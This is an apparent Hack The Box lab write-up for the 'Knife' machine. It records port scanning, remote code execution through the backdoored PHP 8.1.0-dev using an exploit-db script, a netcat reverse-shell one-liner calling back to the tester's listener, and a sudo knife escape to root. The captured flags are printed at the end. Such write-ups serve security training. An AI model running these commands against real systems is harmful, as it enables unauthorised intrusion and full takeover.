# knife htb

## nmap

First things first, I ran nmap, to see which ports knife had open.

```bash
┌──(kali㉿kali)-[~/htb/knife]                                                                                                                                                   
└─$ nmap 10.129.23.91 -p- -T4| tee nmapf                                                                                                                                        
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-23 22:33 EST                                                                                                                 
Nmap scan report for 10.129.23.91                                                                                                                                               
Host is up (0.036s latency).                                                                                                                                                    
Not shown: 65533 closed tcp ports (reset)                                                                                                                                       
PORT   STATE SERVICE                                                                                                                                                            
22/tcp open  ssh                                                                                                                                                                
80/tcp open  http                                                                                                                                                               
                                                                                                                                                                                
Nmap done: 1 IP address (1 host up) scanned in 14.17 seconds                                                                                                                    
                                                                                                                                                                                
                                                                                                                                                                                
┌──(kali㉿kali)-[~/htb/knife]                                                                                                                                                   
└─$ nmap 10.129.23.91 -p 22,80 -sC -sV | tee nmapv                                                                                                                              
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-23 22:38 EST                                                                                                                 
Nmap scan report for 10.129.23.91                                                                                                                                               
Host is up (0.031s latency).                                                                                                                                                    
                                                                                                                                                                                
PORT   STATE SERVICE VERSION                                                                                                                                                    
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)                                                                                               
| ssh-hostkey:                                                                                                                                                                  
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)                                                                                                                  
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)                                                                                                                 
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)                                                                                                               
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))                                                                                                                             
|_http-server-header: Apache/2.4.41 (Ubuntu)                                                                                                                                    
|_http-title:  Emergent Medical Idea                                                                                                                                            
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                                                                                         
                                                                                                                                                                                
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                  
Nmap done: 1 IP address (1 host up) scanned in 7.83 seconds                                                                                                                     
                                                                                                                                                                          
```

## Web exploitation

Upon visiting the site at /, it was mostly an empty page, with no useful links, subdomains, nor other files. Fuzzing for files and directories yielded no results, 
though, when I was fuzzing for for non .php files, apache returned 403 on hidden files(files starting with .), and this behavior wasn't occuring when scanning for .php files.

Since fuzzing yielded no results, I pivotted to exploring the HTTP headers. Using burp to GET /, website returned
```pgsql
HTTP/1.1 200 OK
Date: Wed, 24 Dec 2025 03:41:49 GMT
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/8.1.0-dev
Vary: Accept-Encoding
Content-Length: 5815
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
```

The X-Powered-By header caught my attention, as it was a dev version. Googling "cve PHP/8.1.0-dev", I found many blog posts explaining that this version of PHP is backdoored, and was quickly fixed
in newer versions, though, not in this one.
I did find a script that exploits this on exploitdb with:
```bash
┌──(kali㉿kali)-[~/htb/knife]
└─$ searchsploit 8.1.0-dev                                                                                                                                                     
--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                               |  Path
--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution                                                                                          | php/webapps/49933.py
--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

I ran it with:

```
┌──(kali㉿kali)-[~/htb/knife]
└─$ python3 49933.py 
Enter the full host url:
http://10.129.23.91/

Interactive shell is opened on http://10.129.23.91/ 
Can't acces tty; job crontol turned off.
$ id
uid=1000(james) gid=1000(james) groups=1000(james)

$ 
```
And got code execution as the user james.

I don't particularly enjoy using shells from scripts directly, so I decided to upgrade my shell with:
```bash
$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.162 6100 >/tmp/f


┌──(kali㉿kali)-[~]
└─$ rlwrap nc -lvnp 6100
listening on [any] 6100 ...
connect to [10.10.14.162] from (UNKNOWN) [10.129.23.91] 33464
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
james@knife:/$ ls
ls
bin   cdrom  etc   lib    lib64   lost+found  mnt  proc  run   snap  sys  usr
boot  dev    home  lib32  libx32  media       opt  root  sbin  srv   tmp  var
```
## Privilege Escalation
After figuring out the environment I'm dealing with, I decided to check for sudo permissions.

```bash
james@knife:~$ sudo -l                                                                  
sudo -l                                                                                                                                                 
Matching Defaults entries for james on knife:                                
    env_reset, mail_badpass,                                                                                                                            
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
                                                                                                                                                        
User james may run the following commands on knife:                          
    (root) NOPASSWD: /usr/bin/knife
```

The knife binary is new to me, firstly I thought it was custom, though, upon running it, the output was very long, and unlikely for it not to be public.

I googled: binary `/usr/bin/knife`
This assured me that it's not custom, and upon scrolling a little, I found a blog post showing a privilege escalation vector over this with:
`knife exec -E 'exec "/bin/sh"' If the binary is allowed to run as superuser by sudo`

Running it got me root.
```

james@knife:~$ sudo /usr/bin/knife exec -E 'exec "/bin/sh"'                                                                                                          
sudo /usr/bin/knife exec -E 'exec "/bin/sh"'                                            
# id                               
id                                                                          
uid=0(root) gid=0(root) groups=0(root)                                      
#   
```

Flags:
```bash
cat /home/james/user.txt                                                                
595f8b2900036de01ef0582536f97670                                                        
# cat /root/root.txt
cat /root/root.txt              
babae8cecad24965a44207f2cf06ab57      
# 
```
